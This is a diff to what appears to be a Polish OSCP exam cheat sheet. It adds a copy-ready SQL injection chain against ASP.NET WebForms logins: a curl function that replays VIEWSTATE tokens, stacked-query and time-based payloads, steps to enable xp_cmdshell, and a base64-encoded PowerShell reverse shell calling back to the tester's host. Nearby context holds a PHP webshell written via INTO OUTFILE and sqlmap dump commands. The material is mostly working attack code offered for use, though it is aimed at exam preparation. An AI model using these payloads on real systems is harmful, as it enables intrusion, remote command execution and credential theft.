@@ -430,7 +430,28 @@ impacket-mssqlclient sa:passw0rd@$ip -windows-auth     # mssql; select name from
 &#x27; union select &quot;&lt;?php system($_get[&#x27;cmd&#x27;]);?&gt;&quot;,null,null,null,null into outfile &quot;/var/www/html/tmp/webshell.php&quot; -- //
 -- następnie: http://target_ip/tmp/webshell.php?cmd=id blind (time-based) &#x27; and if (1=1, sleep(3),&#x27;false&#x27;) -- // mssql — rce przez xp_cmdshell impacket-mssqlclient administrator:lab123@$ip -windows-auth   # 1. wejdź do bazy execute sp_configure &#x27;show advanced options&#x27;,1; reconfigure;
 execute sp_configure &#x27;xp_cmdshell&#x27;,1; reconfigure;
-execute xp_cmdshell &#x27;whoami&#x27;;" id="p2-initial-access-exploitation-uzyskanie-dostępu-21-web-attacks-sql-injection"><h3 class="card-h">2.1 Web attacks — SQL Injection</h3><blockquote>🎯 <strong>Drogowskaz — SQLi → RCE:</strong> 1) <strong>fingerprint DBMS</strong> (<code>@@version</code>/<code>version()</code> — styl komentarzy i RCE różnią się per silnik). 2) masz creds/otwarty port? wejdź natywnie (poniżej) i enumeruj obok SQLi. 3) potwierdź injekcję (sama <code>&#x27;</code> = błąd składni) → <code>OR 1=1</code>/UNION/blind. 4) enumeruj: user → privileged? → bazy → tabele (<code>information_schema</code>/<code>sys.databases</code>), celuj w <strong>custom</strong> DB. 5) dump hashy → crack. 6) RCE: MSSQL <code>xp_cmdshell</code> · MySQL <code>INTO OUTFILE</code>. 7) blind/za wolno → sqlmap (głośny, na exam do identyfikacji).</blockquote>
+execute xp_cmdshell &#x27;whoami&#x27;; asp.net webforms (`.aspx` login) sqli → rce — manualnie przez curl klasyk oscp (np. challenge „medtech&quot;): formularz `login.aspx` z polami `...$usernametextbox`/`...$passwordtextbox`. dwie pułapki, przez które łatwo uznać, że „nie ma injekcji&quot;: 1. **viewstate:** każdy post musi nieść świeże `__viewstate`, `__viewstategenerator`, `__eventvalidation` pobrane get-em tuż przed. bez tego serwer zwraca **http 500 (viewstate mac)** — a wysłanie poprawnych tokenów i dostanie 200 to zarazem **dowód, że post jest przetwarzany**. 2. **pusta tabela userów:** `or 1=1` nie zaloguje i error-based przez `where` milczy (brak wierszy do ewaluacji predykatu). nie odpuszczaj — testuj **stacked queries** i **time-based**. **krok 1 — funkcja pobierająca świeże tokeny i strzelająca payloadem (skopiuj do terminala):** url=&quot;http://$ip/login.aspx&quot;
+inject(){
+  # 1) get — wyciągnij świeże tokeny webforms
+  page=$(curl -s &quot;$url&quot;)
+  vs=$(echo &quot;$page&quot;  | grep -op &#x27;id=&quot;__viewstate&quot; value=&quot;\k[^&quot;]+&#x27;)
+  vg=$(echo &quot;$page&quot;  | grep -op &#x27;id=&quot;__viewstategenerator&quot; value=&quot;\k[^&quot;]+&#x27;)
+  ev=$(echo &quot;$page&quot;  | grep -op &#x27;id=&quot;__eventvalidation&quot; value=&quot;\k[^&quot;]+&#x27;)
+  # 2) post — wstrzyknij w pole username ($1), zmierz czas i rozmiar odpowiedzi
+  curl -s -o /tmp/resp.html -w &quot;czas=%{time_total}s rozmiar=%{size_download}b kod=%{http_code}\n&quot; &quot;$url&quot; \
+    --data-urlencode &quot;__viewstate=$vs&quot; \
+    --data-urlencode &quot;__viewstategenerator=$vg&quot; \
+    --data-urlencode &quot;__eventvalidation=$ev&quot; \
+    --data-urlencode &#x27;ctl00$contentplaceholder1$usernametextbox=&#x27;&quot;$1&quot; \
+    --data-urlencode &#x27;ctl00$contentplaceholder1$passwordtextbox=x&#x27; \
+    --data-urlencode &#x27;ctl00$contentplaceholder1$loginbutton=login&#x27;
+} **krok 2 — potwierdź injekcję i silnik (error-based, `customerrors` zwykle off):** inject &quot;&#x27; or 1=1#&quot;        # &#x27;#&#x27; nie jest komentarzem w mssql -&gt; pelny stack trace
+grep -i &quot;sqlexception\|incorrect syntax\|unclosed&quot; /tmp/resp.html
+#   -&gt; &quot;system.data.sqlclient.sqlexception: incorrect syntax near &#x27;#&#x27;&quot; = mssql + webroot ze sciezki w bledzie **krok 3 — stacked queries (najkrótsza droga do rce) + rola sysadmin:** inject &quot;&#x27;;waitfor delay &#x27;0:0:5&#x27;-- -&quot;                                   # czas ~5s = stacked dziala
+inject &quot;&#x27;;if is_srvrolemember(&#x27;sysadmin&#x27;)=1 waitfor delay &#x27;0:0:5&#x27;-- -&quot; # ~5s = jestesmy sysadmin **krok 4 — włącz `xp_cmdshell` i wykonaj komendę (każdy payload = osobny `inject`):** inject &quot;&#x27;;exec sp_configure &#x27;show advanced options&#x27;,1;reconfigure;exec sp_configure &#x27;xp_cmdshell&#x27;,1;reconfigure;-- -&quot;
+inject &quot;&#x27;;exec master..xp_cmdshell &#x27;ping -n 4 &lt;twoj_kali&gt;&#x27;-- -&quot;        # potwierdz na: sudo tcpdump -i tun0 icmp **krok 5 — reverse shell (powershell, `-e` = base64 utf-16le; listener `nc -lvnp 443` przed):** psrs=&#x27;$c=new-object system.net.sockets.tcpclient(&quot;&lt;twoj_kali&gt;&quot;,443);$s=$c.getstream();[byte[]]$b=0..65535|%{0};while(($i=$s.read($b,0,$b.length)) -ne 0){$d=(new-object text.asciiencoding).getstring($b,0,$i);$sb=(iex $d 2&gt;&amp;1|out-string);$sb2=$sb+&quot;ps &quot;+(pwd).path+&quot;&gt; &quot;;$sby=([text.encoding]::ascii).getbytes($sb2);$s.write($sby,0,$sby.length);$s.flush()};$c.close()&#x27;
+b64=$(echo -n &quot;$psrs&quot; | iconv -t utf-16le | base64 -w0)
+inject &quot;&#x27;;exec master..xp_cmdshell &#x27;powershell -e $b64&#x27;-- -&quot; shell wraca zwykle jako `nt service\mssql$sqlexpress` → `whoami /priv` prawie zawsze ma **seimpersonateprivilege** → potato do system (§4). łup na start: `type c:\inetpub\wwwroot\web.config` (connection string `sa`) — reuse w domenie." id="p2-initial-access-exploitation-uzyskanie-dostępu-21-web-attacks-sql-injection"><h3 class="card-h">2.1 Web attacks — SQL Injection</h3><blockquote>🎯 <strong>Drogowskaz — SQLi → RCE:</strong> 1) <strong>fingerprint DBMS</strong> (<code>@@version</code>/<code>version()</code> — styl komentarzy i RCE różnią się per silnik). 2) masz creds/otwarty port? wejdź natywnie (poniżej) i enumeruj obok SQLi. 3) potwierdź injekcję (sama <code>&#x27;</code> = błąd składni) → <code>OR 1=1</code>/UNION/blind. 4) enumeruj: user → privileged? → bazy → tabele (<code>information_schema</code>/<code>sys.databases</code>), celuj w <strong>custom</strong> DB. 5) dump hashy → crack. 6) RCE: MSSQL <code>xp_cmdshell</code> · MySQL <code>INTO OUTFILE</code>. 7) blind/za wolno → sqlmap (głośny, na exam do identyfikacji).</blockquote>
 <p><strong>Natywny klient (gdy masz creds / otwarty 3306/1433) — szybsze niż przez SQLi:</strong></p>
 <div class="code"><button class="copy" type="button" aria-label="Kopiuj"><span class="ico">⧉</span><span class="lbl">copy</span></button><pre><code>mysql -u root -p&#x27;root&#x27; -h $IP -P 3306 --skip-ssl      # ERROR 2026 TLS → --skip-ssl; potem: select version(); system_user();
 #   SELECT user,authentication_string FROM mysql.user;   -- hashe MySQL8 (Caching-SHA-256) do łamania
@@ -464,7 +485,41 @@ impacket-mssqlclient sa:Passw0rd@$IP -windows-auth     # MSSQL; SELECT name FROM
 <div class="code"><button class="copy" type="button" aria-label="Kopiuj"><span class="ico">⧉</span><span class="lbl">copy</span></button><pre><code>impacket-mssqlclient Administrator:Lab123@$IP -windows-auth   # 1. wejdź do bazy</code></pre></div>
 <div class="code"><button class="copy" type="button" aria-label="Kopiuj"><span class="ico">⧉</span><span class="lbl">copy</span></button><pre><code>EXECUTE sp_configure &#x27;show advanced options&#x27;,1; RECONFIGURE;
 EXECUTE sp_configure &#x27;xp_cmdshell&#x27;,1; RECONFIGURE;
-EXECUTE xp_cmdshell &#x27;whoami&#x27;;</code></pre></div></section><section class="card" data-text="2.2 sqlmap (automatyzacja) # szybkie znalezienie punktu wstrzyknięcia (get)
+EXECUTE xp_cmdshell &#x27;whoami&#x27;;</code></pre></div>
+<h4 class="leaf">ASP.NET WebForms (<code>.aspx</code> login) SQLi → RCE — manualnie przez curl</h4>
+<blockquote>Klasyk OSCP (np. challenge „Medtech&quot;): formularz <code>login.aspx</code> z polami <code>...$UsernameTextBox</code>/<code>...$PasswordTextBox</code>. Dwie pułapki, przez które łatwo uznać, że „nie ma injekcji&quot;: 1. <strong>VIEWSTATE:</strong> KAŻDY POST musi nieść świeże <code>__VIEWSTATE</code>, <code>__VIEWSTATEGENERATOR</code>, <code>__EVENTVALIDATION</code> pobrane GET-em tuż przed. Bez tego serwer zwraca <strong>HTTP 500 (viewstate MAC)</strong> — a wysłanie poprawnych tokenów i dostanie 200 to zarazem <strong>dowód, że POST jest przetwarzany</strong>. 2. <strong>Pusta tabela userów:</strong> <code>OR 1=1</code> nie zaloguje i error-based przez <code>WHERE</code> milczy (brak wierszy do ewaluacji predykatu). Nie odpuszczaj — testuj <strong>stacked queries</strong> i <strong>time-based</strong>.</blockquote>
+<p><strong>Krok 1 — funkcja pobierająca świeże tokeny i strzelająca payloadem (skopiuj do terminala):</strong></p>
+<div class="code"><button class="copy" type="button" aria-label="Kopiuj"><span class="ico">⧉</span><span class="lbl">copy</span></button><pre><code>URL=&quot;http://$IP/login.aspx&quot;
+inject(){
+  # 1) GET — wyciągnij świeże tokeny WebForms
+  page=$(curl -s &quot;$URL&quot;)
+  vs=$(echo &quot;$page&quot;  | grep -oP &#x27;id=&quot;__VIEWSTATE&quot; value=&quot;\K[^&quot;]+&#x27;)
+  vg=$(echo &quot;$page&quot;  | grep -oP &#x27;id=&quot;__VIEWSTATEGENERATOR&quot; value=&quot;\K[^&quot;]+&#x27;)
+  ev=$(echo &quot;$page&quot;  | grep -oP &#x27;id=&quot;__EVENTVALIDATION&quot; value=&quot;\K[^&quot;]+&#x27;)
+  # 2) POST — wstrzyknij w pole username ($1), zmierz czas i rozmiar odpowiedzi
+  curl -s -o /tmp/resp.html -w &quot;czas=%{time_total}s rozmiar=%{size_download}B kod=%{http_code}\n&quot; &quot;$URL&quot; \
+    --data-urlencode &quot;__VIEWSTATE=$vs&quot; \
+    --data-urlencode &quot;__VIEWSTATEGENERATOR=$vg&quot; \
+    --data-urlencode &quot;__EVENTVALIDATION=$ev&quot; \
+    --data-urlencode &#x27;ctl00$ContentPlaceHolder1$UsernameTextBox=&#x27;&quot;$1&quot; \
+    --data-urlencode &#x27;ctl00$ContentPlaceHolder1$PasswordTextBox=x&#x27; \
+    --data-urlencode &#x27;ctl00$ContentPlaceHolder1$LoginButton=Login&#x27;
+}</code></pre></div>
+<p><strong>Krok 2 — potwierdź injekcję i silnik (error-based, <code>customErrors</code> zwykle OFF):</strong></p>
+<div class="code"><button class="copy" type="button" aria-label="Kopiuj"><span class="ico">⧉</span><span class="lbl">copy</span></button><pre><code>inject &quot;&#x27; OR 1=1#&quot;        # &#x27;#&#x27; nie jest komentarzem w MSSQL -&gt; pelny stack trace
+grep -i &quot;SqlException\|Incorrect syntax\|Unclosed&quot; /tmp/resp.html
+#   -&gt; &quot;System.Data.SqlClient.SqlException: Incorrect syntax near &#x27;#&#x27;&quot; = MSSQL + webroot ze sciezki w bledzie</code></pre></div>
+<p><strong>Krok 3 — stacked queries (najkrótsza droga do RCE) + rola sysadmin:</strong></p>
+<div class="code"><button class="copy" type="button" aria-label="Kopiuj"><span class="ico">⧉</span><span class="lbl">copy</span></button><pre><code>inject &quot;&#x27;;WAITFOR DELAY &#x27;0:0:5&#x27;-- -&quot;                                   # czas ~5s = stacked dziala
+inject &quot;&#x27;;IF IS_SRVROLEMEMBER(&#x27;sysadmin&#x27;)=1 WAITFOR DELAY &#x27;0:0:5&#x27;-- -&quot; # ~5s = jestesmy sysadmin</code></pre></div>
+<p><strong>Krok 4 — włącz <code>xp_cmdshell</code> i wykonaj komendę (każdy payload = osobny <code>inject</code>):</strong></p>
+<div class="code"><button class="copy" type="button" aria-label="Kopiuj"><span class="ico">⧉</span><span class="lbl">copy</span></button><pre><code>inject &quot;&#x27;;EXEC sp_configure &#x27;show advanced options&#x27;,1;RECONFIGURE;EXEC sp_configure &#x27;xp_cmdshell&#x27;,1;RECONFIGURE;-- -&quot;
+inject &quot;&#x27;;EXEC master..xp_cmdshell &#x27;ping -n 4 &lt;TWOJ_KALI&gt;&#x27;-- -&quot;        # potwierdz na: sudo tcpdump -i tun0 icmp</code></pre></div>
+<p><strong>Krok 5 — reverse shell (PowerShell, <code>-e</code> = base64 UTF-16LE; listener <code>nc -lvnp 443</code> PRZED):</strong></p>
+<div class="code"><button class="copy" type="button" aria-label="Kopiuj"><span class="ico">⧉</span><span class="lbl">copy</span></button><pre><code>PSRS=&#x27;$c=New-Object System.Net.Sockets.TCPClient(&quot;&lt;TWOJ_KALI&gt;&quot;,443);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2&gt;&amp;1|Out-String);$sb2=$sb+&quot;PS &quot;+(pwd).Path+&quot;&gt; &quot;;$sby=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sby,0,$sby.Length);$s.Flush()};$c.Close()&#x27;
+B64=$(echo -n &quot;$PSRS&quot; | iconv -t UTF-16LE | base64 -w0)
+inject &quot;&#x27;;EXEC master..xp_cmdshell &#x27;powershell -e $B64&#x27;-- -&quot;</code></pre></div>
+<blockquote>Shell wraca zwykle jako <code>nt service\mssql$sqlexpress</code> → <code>whoami /priv</code> prawie zawsze ma <strong>SeImpersonatePrivilege</strong> → potato do SYSTEM (§4). Łup na start: <code>type C:\inetpub\wwwroot\web.config</code> (connection string <code>sa</code>) — reuse w domenie.</blockquote></section><section class="card" data-text="2.2 sqlmap (automatyzacja) # szybkie znalezienie punktu wstrzyknięcia (get)
 sqlmap -u &quot;http://$ip/blindsqli.php?user=1&quot; -p user
 sqlmap -u &quot;http://$ip/blindsqli.php?user=1&quot; -p user --dump     # dump danych
 
